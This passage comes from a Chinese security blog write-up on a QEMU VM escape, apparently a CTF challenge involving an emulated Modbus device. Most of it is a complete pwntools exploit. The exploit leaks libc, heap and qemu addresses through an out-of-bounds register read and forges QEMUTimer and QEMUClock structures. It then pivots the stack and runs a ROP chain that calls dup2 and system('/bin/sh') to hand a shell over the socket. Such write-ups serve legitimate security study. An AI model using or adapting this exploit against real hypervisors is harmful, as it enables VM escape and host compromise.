lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>8</b></font> -&gt; <span style="background-color:#171421"><font color="#C01C28"><b>&apos;anon_inode:[eventfd]&apos;</b></font></span>
lrwx------ 1 ctf ctf 64 Oct 30 10:49 <font color="#2AA1B3"><b>9</b></font> -&gt; <font color="#A347BA"><b>&apos;socket:[276587]&apos;</b></font>
</pre>

<p>QEMU 进程的两个 socket 进程描述符分别是：</p>
<ul>
<li><code>/proc/170/fd/9 -&gt; socket:[276587]</code>：监听 0.0.0.0:1502 的 <strong>listening socket</strong>。</li>
<li><code>/proc/170/fd/10 -&gt; socket:[274261]</code>：某个客户端连上后 <code>accept()</code> 返回的 <strong>已连接 socket</strong>。</li>
</ul>
<p>因此我们只需要通过 <code>dup2</code> 将 stdin 与 stdout 和 10 绑定即可确保 <code>system(&quot;/bin/sh&quot;)</code> 交互。</p>
<blockquote>
<p><strong><code>dup2(oldfd, newfd)</code> 就是把 <code>oldfd</code> 这个打开好的文件&#x2F;套接字复制成编号为 <code>newfd</code> 的描述符</strong>。如果 <code>newfd</code> 原来已经在用，内核会先把它关掉，再让它指向和 <code>oldfd</code> <strong>同一个内核对象</strong>（同一个 “open file description”）。成功后返回值是 <code>newfd</code>。</p>
<p>执行 <code>dup2(10, 0); dup2(10, 1); dup2(10, 2);</code> 等价于把标准输入&#x2F;输出&#x2F;错误（0&#x2F;1&#x2F;2）<strong>接到这个 socket 上</strong>。</p>
<p>于是后续 <code>system(&quot;/bin/sh&quot;)</code> 启动的 <code>sh</code> 会从 FD 0 读、往 FD 1&#x2F;2 写——也就是通过这条网络连接进行交互，你的远端就能直接操作 shell。</p>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fd_guess = <span class="number">10</span></span><br><span class="line">rop = <span class="string">b&quot;&quot;</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(fd_guess)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;dup2&#x27;</span>])</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(fd_guess)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;dup2&#x27;</span>])</span><br><span class="line"><span class="comment"># rop += p64(next(libc.search(asm(&#x27;pop rdi; ret;&#x27;))))</span></span><br><span class="line"><span class="comment"># rop += p64(fd_guess)</span></span><br><span class="line"><span class="comment"># rop += p64(next(libc.search(asm(&#x27;pop rsi; ret;&#x27;))))</span></span><br><span class="line"><span class="comment"># rop += p64(2)</span></span><br><span class="line"><span class="comment"># rop += p64(libc.sym[&#x27;dup2&#x27;])</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">rop += p64(libc.address + <span class="number">0x582d2</span>)  <span class="comment"># p64(libc.sym[&#x27;do_system&#x27;] + 2)</span></span><br><span class="line"><span class="comment"># rop += p64(libc.sym[&#x27;system&#x27;])</span></span><br></pre></td></tr></table></figure></div>

<h2 id="完整-Exp-6"><a href="#完整-Exp-6" class="headerlink" title="完整 Exp"></a>完整 Exp</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(target=(&quot;localhost&quot;, 2345), exe=&quot;./qemu-system-x86_64&quot;,</span></span><br><span class="line"><span class="comment">#            gdbscript=&quot;b *$rebase(0x0000000000709c51)\nc&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1502</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc16_modbus</span>(<span class="params">b</span>):</span><br><span class="line">    crc = <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> b:</span><br><span class="line">        crc ^= x</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            crc = (crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span> <span class="keyword">if</span> (crc &amp; <span class="number">1</span>) <span class="keyword">else</span> (crc &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> crc &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fc03_req</span>(<span class="params">addr, start, count</span>):</span><br><span class="line">    frm = <span class="built_in">bytearray</span>([addr &amp; <span class="number">0xFF</span>, <span class="number">0x03</span>])</span><br><span class="line">    frm += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, start &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    frm += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, count &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    frm += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, crc16_modbus(frm))</span><br><span class="line">    io.send(frm)</span><br><span class="line">    h = io.recvn(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> h[<span class="number">1</span>] &amp; <span class="number">0x80</span>:</span><br><span class="line">        ex = io.recvn(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;exception frame: <span class="subst">&#123;h.<span class="built_in">hex</span>()&#125;</span> <span class="subst">&#123;ex.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> h[<span class="number">1</span>] == <span class="number">0x03</span></span><br><span class="line">    bc = h[<span class="number">2</span>]</span><br><span class="line">    body = io.recvn(bc + <span class="number">2</span>)</span><br><span class="line">    data, crc = body[:-<span class="number">2</span>], body[-<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> crc16_modbus(h + data) != <span class="built_in">int</span>.from_bytes(crc, <span class="string">&#x27;little&#x27;</span>):</span><br><span class="line">        log.warning(<span class="string">&quot;CRC mismatch&quot;</span>)</span><br><span class="line">    <span class="comment"># 大端 16-bit → 原始内存小端字节</span></span><br><span class="line">    mem = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">            mem += data[i + <span class="number">1</span>:i + <span class="number">2</span>] + data[i:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> mem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fc10_req</span>(<span class="params">addr, start, data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="comment"># 若为奇数长度，自动补 0x00，保证能整 16 位写入</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        log.info(<span class="string">&quot;fc10_write: data 为奇数长度，自动在末尾填充 0x00&quot;</span>)</span><br><span class="line">        data = data + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    count = <span class="built_in">len</span>(data) // <span class="number">2</span></span><br><span class="line">    <span class="comment"># 单帧上限：need = 9 + 2*count &lt;= 260 → count &lt;= 125</span></span><br><span class="line">    <span class="keyword">if</span> count &gt; <span class="number">125</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;data 过长：count=<span class="subst">&#123;count&#125;</span> 超出单帧上限 125（受 260 字节 RX 缓冲限制）。请分帧调用。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组帧：addr, 0x10, start(2BE), count(2BE), byte_count(1), data(2*count,BE), crc(2LE)</span></span><br><span class="line">    frm = <span class="built_in">bytearray</span>([addr &amp; <span class="number">0xFF</span>, <span class="number">0x10</span>])</span><br><span class="line">    frm += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, start &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    frm += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, count &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    frm.append((<span class="number">2</span> * count) &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># data 是“目标内存小端”的真实字节序。</span></span><br><span class="line">    <span class="comment"># Modbus 寄存器传输为大端：把 (lo,hi) → pack(&quot;&gt;H&quot;, lo | (hi&lt;&lt;8))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">2</span>):</span><br><span class="line">        lo = data[i]</span><br><span class="line">        hi = data[i + <span class="number">1</span>]</span><br><span class="line">        hi, lo = lo, hi</span><br><span class="line">        frm += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, (lo | (hi &lt;&lt; <span class="number">8</span>)) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"></span><br><span class="line">    frm += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, crc16_modbus(frm))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发包</span></span><br><span class="line">    io.send(frm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 收应答：正常为 8 字节（addr func start count crc）</span></span><br><span class="line">    h = io.recvn(<span class="number">2</span>)  <span class="comment"># addr, func</span></span><br><span class="line">    <span class="keyword">if</span> h[<span class="number">1</span>] &amp; <span class="number">0x80</span>:</span><br><span class="line">        ex = io.recvn(<span class="number">3</span>)  <span class="comment"># ex_code, crc_lo, crc_hi</span></span><br><span class="line">        <span class="keyword">if</span> crc16_modbus(h + ex[:<span class="number">1</span>]) != <span class="built_in">int</span>.from_bytes(ex[<span class="number">1</span>:], <span class="string">&#x27;little&#x27;</span>):</span><br><span class="line">            log.warning(<span class="string">&quot;FC10 异常帧 CRC 不匹配&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;FC10 exception: code=0x<span class="subst">&#123;ex[<span class="number">0</span>]:02x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    body = io.recvn(<span class="number">6</span>)  <span class="comment"># start(2), count(2), crc(2)</span></span><br><span class="line">    <span class="keyword">if</span> crc16_modbus(h + body[:-<span class="number">2</span>]) != <span class="built_in">int</span>.from_bytes(body[-<span class="number">2</span>:], <span class="string">&#x27;little&#x27;</span>):</span><br><span class="line">        log.warning(<span class="string">&quot;FC10 响应 CRC 不匹配&quot;</span>)</span><br><span class="line"></span><br><span class="line">    start_echo = struct.unpack(<span class="string">&#x27;&gt;H&#x27;</span>, body[<span class="number">0</span>:<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    count_echo = struct.unpack(<span class="string">&#x27;&gt;H&#x27;</span>, body[<span class="number">2</span>:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> start_echo, count_echo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">qemu = ELF(<span class="string">&quot;./qemu-system-x86_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = fc03_req(<span class="number">0</span>, (<span class="number">0x10000</span> - <span class="number">127</span>), <span class="number">127</span>)[<span class="number">4</span>:]  <span class="comment"># [0xff81*2,(0xff81+127)*2-1]=[0x1ff02,0x1ffff]</span></span><br><span class="line"><span class="built_in">print</span>(hexdump(leak))</span><br><span class="line">libc.address = u64(leak[<span class="number">0x38</span>:<span class="number">0x38</span> + <span class="number">8</span>]) - <span class="number">0x203b60</span></span><br><span class="line">success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">heap_base = u64(leak[<span class="number">0x48</span>:<span class="number">0x48</span> + <span class="number">8</span>]) - <span class="number">0xa4270</span></span><br><span class="line">success(<span class="string">&quot;heap base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">qemu.address = u64(leak[<span class="number">0xe0</span>:<span class="number">0xe0</span> + <span class="number">8</span>]) - <span class="number">0x9ea35e</span></span><br><span class="line">success(<span class="string">&quot;qemu base: &quot;</span> + <span class="built_in">hex</span>(qemu.address))</span><br><span class="line"></span><br><span class="line">payload_addr = heap_base + <span class="number">0x82eb0</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload += flat(&#123;</span><br><span class="line">    <span class="number">0</span>: p64(<span class="number">0xdeaddead</span>),  <span class="comment"># QEMUClock</span></span><br><span class="line">    <span class="number">0x8</span>: flat(&#123;  <span class="comment"># QemuMutex</span></span><br><span class="line">        <span class="number">0x0</span>: flat(  <span class="comment"># lock</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __lock</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __count</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __owner</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __nusers</span></span><br><span class="line">            p32(<span class="number">0</span>),  <span class="comment"># __kind = PTHREAD_MUTEX_TIMED_NP (0)</span></span><br><span class="line">            p16(<span class="number">0</span>),  <span class="comment"># __spins</span></span><br><span class="line">            p16(<span class="number">0</span>),  <span class="comment"># __elision</span></span><br><span class="line">            p64(<span class="number">0</span>),  <span class="comment"># __list.__prev</span></span><br><span class="line">            p64(<span class="number">0</span>)  <span class="comment"># __list.__next</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x34</span>: p8(<span class="number">1</span>)  <span class="comment"># initialized</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="number">0x40</span>: p64(<span class="number">0xbeefbeef</span>)  <span class="comment"># QEMUTimer</span></span><br><span class="line">&#125;)</span><br><span class="line">payload = payload.replace(p64(<span class="number">0xbeefbeef</span>), p64(payload_addr + <span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000709c51 : push rax ; add byte ptr [rax - 0x75], cl ; pop rbp ; clc ; leave ; xor eax, eax ; xor edx, edx ; xor ecx, ecx ; xor esi, esi ; xor edi, edi ; ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">stack_pivot = qemu.address + <span class="number">0x0000000000709c51</span></span><br><span class="line"></span><br><span class="line">payload += flat(&#123;  <span class="comment"># QEMUTimer</span></span><br><span class="line">    <span class="number">0x0</span>: p64(<span class="number">0</span>),  <span class="comment"># expire_time</span></span><br><span class="line">    <span class="number">0x10</span>: p64(stack_pivot),  <span class="comment"># cb</span></span><br><span class="line">    <span class="number">0x18</span>: p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># attributes</span></span><br><span class="line">&#125;)</span><br><span class="line">payload = payload.replace(p64(<span class="number">0xdeaddead</span>), p64(payload_addr + <span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">payload += flat(&#123;  <span class="comment"># QEMUClock</span></span><br><span class="line">    <span class="number">0x8</span>: p32(<span class="number">0</span>),  <span class="comment"># type</span></span><br><span class="line">    <span class="number">0xc</span>: p8(<span class="number">1</span>),  <span class="comment"># enabled</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fd_guess = <span class="number">10</span></span><br><span class="line">rop = <span class="string">b&quot;&quot;</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(fd_guess)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;dup2&#x27;</span>])</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(fd_guess)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;dup2&#x27;</span>])</span><br><span class="line"><span class="comment"># rop += p64(next(libc.search(asm(&#x27;pop rdi; ret;&#x27;))))</span></span><br><span class="line"><span class="comment"># rop += p64(fd_guess)</span></span><br><span class="line"><span class="comment"># rop += p64(next(libc.search(asm(&#x27;pop rsi; ret;&#x27;))))</span></span><br><span class="line"><span class="comment"># rop += p64(2)</span></span><br><span class="line"><span class="comment"># rop += p64(libc.sym[&#x27;dup2&#x27;])</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>))))</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">rop += p64(libc.address + <span class="number">0x582d2</span>)  <span class="comment"># p64(libc.sym[&#x27;do_system&#x27;] + 2)</span></span><br><span class="line"><span class="comment"># rop += p64(libc.sym[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span> * <span class="number">3</span></span><br><span class="line">payload = payload.replace(p64(<span class="number">0xdeadbeef</span>), p64(payload_addr + <span class="built_in">len</span>(payload) - <span class="number">8</span>))</span><br><span class="line">payload += rop</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;<span class="number">23</span>: payload&#125;,</span><br><span class="line">    filler=cyclic(<span class="number">250</span>, n=<span class="number">8</span>),</span><br><span class="line">    length=<span class="number">250</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;payload len: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="built_in">print</span>(hexdump(payload))</span><br><span class="line"></span><br><span class="line">fc10_req(<span class="number">0</span>, (<span class="number">0x10000</span> - <span class="number">250</span> // <span class="number">2</span>), payload)  <span class="comment"># [0xff83*2,(0xff83+250/2)*2-1]=[0x1ff06,0x1ffff]</span></span><br><span class="line">fc03_req(<span class="number">0</span>, <span class="number">0x10000</span> - <span class="number">0x80</span>, <span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> qemu 逃逸</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-10-30 22:52:43</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-11-13 12:41:42
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/10/30/qemu 逃逸/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/vm-escape/">#vm escape</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/11/13/Java%20Shiro/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java Shiro</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/10/21/Java%20JDBC%20attack/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java JDBC attack</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">qemu 逃逸</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU-%E6%9E%B6%E6%9E%84"><span class="nav-text">QEMU 架构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#QEMU-%E8%BF%9B%E7%A8%8B"><span class="nav-text">QEMU 进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA-Guest-%E7%8E%AF%E5%A2%83"><span class="nav-text">虚拟机 (Guest) 环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KVM-%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8"><span class="nav-text">KVM 内核驱动</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU-%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="nav-text">QEMU 虚拟化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CPU-%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="nav-text">CPU 虚拟化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#vCPU-%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">vCPU 创建与初始化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%BE%AA%E7%8E%AF%E4%B8%8E-VM-Exit-Entry"><span class="nav-text">执行循环与 VM-Exit&#x2F;Entry</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VMCS-VMCB"><span class="nav-text">VMCS&#x2F;VMCB</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" 